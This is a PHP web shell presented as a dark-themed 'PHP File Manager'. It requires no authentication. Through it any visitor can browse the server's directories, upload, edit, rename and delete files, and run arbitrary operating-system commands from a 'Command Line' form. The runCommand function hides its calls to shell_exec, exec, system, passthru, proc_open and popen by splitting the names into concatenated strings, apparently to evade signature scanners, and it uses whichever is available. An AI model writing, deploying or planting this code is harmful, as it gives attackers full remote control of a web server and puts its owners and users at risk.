<?php
session_start();

if (!isset($_SESSION['cwd']) || !is_dir($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
function safePath($path) {
    $real = realpath($path);
    return $real ?: getcwd();
}

$message = '';

function runCommand($cmd) {
    $output = '';

    $funcs = [
        'sh' . 'ell_exec',
        'ex' . 'ec',
        'sy' . 'stem',
        'pas' . 'sthru',
        'pro' . 'c_open',
        'po' . 'pen'
    ];

    foreach ($funcs as $fn) {
        if (function_exists($fn)) {
            switch ($fn) {
                case 'sh' . 'ell_exec':
                    return ($fn)($cmd);
                case 'ex' . 'ec':
                    ($fn)($cmd, $out); return implode("\n", $out);
                case 'sy' . 'stem':
                    ob_start(); ($fn)($cmd); return ob_get_clean();
                case 'pas' . 'sthru':
                    ob_start(); ($fn)($cmd); return ob_get_clean();
                case 'pro' . 'c_open':
                    $descriptorspec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $process = ($fn)($cmd, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        fclose($pipes[0]);
                        $output = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        return $output;
                    }
                    break;
                case 'po' . 'pen':
                    $handle = ($fn)($cmd . " 2>&1", "r");
                    while (!feof($handle)) {
                        $output .= fgets($handle);
                    }
                    pclose($handle);
                    return $output;
            }
        }
    }

    return "No command execution functions available.";
}

if (isset($_POST['nav'])) {
    $target = $_POST['nav'];
    if (is_dir($target)) {
        $_SESSION['cwd'] = safePath($target);
        $message = 'Changed directory.';
    }
}
if (isset($_FILES['upload'])) {
    $target = rtrim($_SESSION['cwd'], '/') . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        $message = 'Upload successful.';
    }
}
if (isset($_POST['delete'])) {
    $target = safePath($_SESSION['cwd'] . '/' . $_POST['delete']);
    if (is_file($target)) {
        unlink($target);
        $message = 'File deleted.';
    } elseif (is_dir($target)) {
        rmdir($target);
        $message = 'Folder deleted.';
    }
}
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = safePath($_SESSION['cwd'] . '/' . $_POST['rename_from']);
    $to   = dirname($from) . '/' . $_POST['rename_to'];
    if (rename($from, $to)) {
        $message = 'Rename successful.';
    }
}
if (isset($_POST['edit_file'], $_POST['content'])) {
    if (file_put_contents(safePath($_SESSION['cwd'] . '/' . $_POST['edit_file']), $_POST['content']) !== false) {
        $message = 'File saved.';
    }
}
if (isset($_POST['newfile'])) {
    $target = $_SESSION['cwd'] . '/' . basename($_POST['newfile']);
    if (!file_exists($target)) {
        file_put_contents($target, '');
        $message = 'File created.';
    }
}
if (isset($_POST['newfolder'])) {
    $target = $_SESSION['cwd'] . '/' . basename($_POST['newfolder']);
    if (!is_dir($target)) {
        mkdir($target);
        $message = 'Folder created.';
    }
}

$cwd = $_SESSION['cwd'];
$all = scandir($cwd);
$dirs = $files = [];
foreach ($all as $item) {
    if ($item === '.') continue;
    $full = $cwd . '/' . $item;
    if (is_dir($full)) $dirs[] = $item;
    else $files[] = $item;
}
sort($dirs);
sort($files);
$items = array_merge($dirs, $files);

$editing  = $_POST['edit']  ?? null;
$viewing  = $_POST['view']  ?? null;
$renaming = $_POST['rename'] ?? null;
$content  = $editing ? @file_get_contents($cwd . '/' . $editing) : null;
$viewContent = $viewing ? @file_get_contents($cwd . '/' . $viewing) : null;

$cmd_output = '';
if (isset($_POST['cli_command'])) {
    $cmd_output = runCommand($_POST['cli_command']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #eee;
        }
        .form-control, .form-control:focus, .btn {
            background-color: #1e1e1e;
            color: #ccc;
            border-color: #333;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .table, .table th, .table td {
            color: #ddd;
            background-color: #1e1e1e;
        }
        .table-light {
            background-color: #2c2c2c;
        }
        .code {
            font-family: monospace;
            background: #1e1e1e;
            color: #ccc;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1em;
            resize: vertical;
            min-height: 200px;
            white-space: pre;
            overflow: auto;
        }
        .alert-info {
            background-color: #222;
            color: #88f;
            border-color: #444;
        }
    </style>
</head>
<body>
<div class="container py-4">
    <h4>PHP File Manager</h4>

    <?php if ($message): ?>
        <div class="alert alert-info"><?= htmlentities($message) ?></div>
    <?php endif; ?>

    <form method="post" class="input-group mb-3">
        <input type="text" name="nav" value="<?= htmlentities($cwd) ?>" class="form-control">
        <button class="btn btn-secondary" type="submit">Go</button>
    </form>

    <form method="post" enctype="multipart/form-data" class="mb-3">
        <div class="input-group">
            <input type="file" name="upload" class="form-control">
            <button class="btn btn-primary" type="submit">Upload</button>
        </div>
    </form>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="newfile" class="form-control" placeholder="New file name">
        <button class="btn btn-outline-light" type="submit">Create File</button>
    </form>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="newfolder" class="form-control" placeholder="New folder name">
        <button class="btn btn-outline-light" type="submit">Create Folder</button>
    </form>

    <?php if ($viewing && $viewContent !== null): ?>
        <div class="mb-4">
            <h5>Viewing: <?= htmlentities($viewing) ?></h5>
            <textarea class="form-control code" readonly><?= htmlentities($viewContent) ?></textarea>
        </div>
    <?php endif; ?>

    <?php if ($editing !== null): ?>
        <div class="mb-4">
            <h5>Editing: <?= htmlentities($editing) ?></h5>
            <form method="post">
                <input type="hidden" name="edit_file" value="<?= htmlentities($editing) ?>">
                <textarea name="content" rows="12" class="form-control code mb-2"><?= htmlentities($content) ?></textarea>
                <button class="btn btn-success" type="submit">Save</button>
            </form>
        </div>
    <?php endif; ?>

    <div class="mb-4">
        <h5>Command Line (auto detect)</h5>
        <form method="post" class="d-flex gap-2 mb-2">
            <input type="text" name="cli_command" class="form-control" placeholder="e.g. ls -la or dir">
            <button class="btn btn-light" type="submit">Run</button>
        </form>
        <?php if ($cmd_output): ?>
            <textarea class="form-control code" readonly><?= htmlentities($cmd_output) ?></textarea>
        <?php endif; ?>
    </div>

    <form method="post">
        <button name="nav" value="<?= dirname($cwd) ?>" class="btn btn-sm btn-outline-light mb-2">&larr; Up</button>
    </form>

    <table class="table table-bordered table-sm">
        <thead class="table-light">
        <tr><th>Name</th><th>Type</th><th class="text-end">Actions</th></tr>
        </thead>
        <tbody>
        <?php foreach ($items as $item):
            $full = $cwd . '/' . $item;
            $isDir = is_dir($full);
        ?>
            <tr>
                <td>
                    <?php if ($renaming === $item): ?>
                        <form method="post" class="d-flex">
                            <input type="hidden" name="rename_from" value="<?= htmlentities($item) ?>">
                            <input type="text" name="rename_to" class="form-control form-control-sm" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-sm btn-success ms-1" type="submit">✔</button>
                        </form>
                    <?php else: ?>
                        <?= htmlentities($item) ?>
                    <?php endif; ?>
                </td>
                <td><?= $isDir ? 'Folder' : 'File' ?></td>
                <td class="text-end">
                    <div class="d-flex justify-content-end flex-wrap gap-1">
                    <?php if ($isDir): ?>
                        <form method="post">
                            <button name="nav" value="<?= $full ?>" class="btn btn-sm btn-outline-light">Open</button>
                        </form>
                    <?php else: ?>
                        <form method="post">
                            <button name="view" value="<?= $item ?>" class="btn btn-sm btn-outline-info">View</button>
                        </form>
                        <form method="post">
                            <button name="edit" value="<?= $item ?>" class="btn btn-sm btn-outline-warning">Edit</button>
                        </form>
                    <?php endif; ?>
                        <form method="post">
                            <button name="rename" value="<?= $item ?>" class="btn btn-sm btn-outline-secondary">Rename</button>
                        </form>
                        <form method="post">
                            <button name="delete" value="<?= $item ?>" class="btn btn-sm btn-outline-danger">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
</div>
</body>
</html>
